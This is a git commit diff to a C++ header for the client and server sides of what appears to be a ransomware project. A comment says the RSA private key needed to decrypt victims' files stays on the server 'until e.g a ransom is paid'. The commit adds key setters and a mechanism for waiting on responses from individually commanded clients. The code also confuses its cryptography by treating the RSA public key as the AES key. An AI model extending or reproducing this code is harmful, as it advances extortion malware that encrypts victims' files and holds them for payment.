6f91dbe1fd8762ddde2094ca4720b5063498d4e2
unknown <ethanjamesoliveira@gmail.com>
2024-09-28 05:40:43 +0100

    Add ability to receive single client responses. Add flag and more methods for server-side. Improve variable clarity.

--- Headers/client.h
+++ Headers/client.h
@@ -21,18 +21,51 @@ public:
 
 #ifdef SERVER_RELEASE
 
-    inline long GenerateCUID() {
+    /* 
+        The rsa private key used to decrypt encrypted files with 
+        client public rsa key. only on server until e.g a ransom is paid
+    */
+    std::string   RSAPrivateKey;
+
+    /*
+        Implementation for event handling- to wait
+        for a new message to be sent from a client.
+
+        Server will be listening from each client that connects with a thread.
+        When data is received, it will be inserted into ClientResponse if ExpectingResponse
+        is set to true by a function. This allows us to make a WaitForClientResponse function
+        that sets expecting response to true and consistantly checks recent client response
+        against last client response, waiting for a new client response.
+    */
+    BOOL ExpectingResponse; // Expecting a ClientResponse from a client not a clientREQUEST
+    ClientResponse RecentClientResponse;
+    ClientResponse LastClientResponse;
+
+    inline long   GenerateCUID() {
         std::default_random_engine generator;
         std::uniform_int_distribution<long> dist(1, 10400);
         return dist(generator);
     }
 
-    inline void SetClientTCPSocket(SOCKET fd) {
+    inline void   SetClientTCPSocket(SOCKET fd) {
         this->TCPSocket = fd;
     }
 
-    inline void SetClientID(long cuid) {
+    inline void   SetClientID(long cuid) {
         this->ClientUID = cuid;
+    }
+
+    inline void   SetAESKey(std::string key) {
+        this->AESEncryptionKey = key;
+    }
+
+    inline void   SetPrivateRSAKey(std::string key) {
+        this->RSAPrivateKey = key;
+    }
+
+    inline void   SetPublicRSAKey(std::string key) {
+        this->RSAPublicKey = key;
+        SetAESKey(key); // rsa public key is same as aes key
     }
 
 #elif defined(CLIENT_RELEASE)
@@ -53,7 +86,7 @@ public:
     
     /*
         Decrypt a ServerRequest that was sent as a BYTESTRING
-        from the TCP server.
+        from the TCP server with AES encryption key.
     */
     ServerRequest DecryptServerRequest(BYTESTRING req); 
 
@@ -61,7 +94,8 @@ public:
         Set the initial, permanant, encryption key for this client
     */
     inline void   SetEncryptionKey(std::string key) {
-        if ( this->EncryptionKey.empty() ) this->EncryptionKey = key;
+        if ( this->AESEncryptionKey.empty() ) this->AESEncryptionKey = key;
+        if ( this->RSAPublicKey.empty() ) this->RSAPublicKey = key;
     }
 protected:
 
@@ -90,7 +124,15 @@ protected:
 
     SOCKET        UDPSocket       = INVALID_SOCKET;
     SOCKET        TCPSocket       = INVALID_SOCKET;
-    std::string   EncryptionKey;                    // Public encryption key for RSA, ENCRYPT AND DECRYPT KEY FOR AES
+
+    std::string   AESEncryptionKey;               // Encryption key used to encrypt and decrypt net_blobs
+
+    /* 
+        Same as AES Encryption key, just more clear on what
+        it is and what its used for. 
+        Used for encrypting files, not requests/NET_BLOBs
+    */
+    std::string   RSAPublicKey;         
 
     /*
         UID is assigned by the server .Used to perform commands on one client.
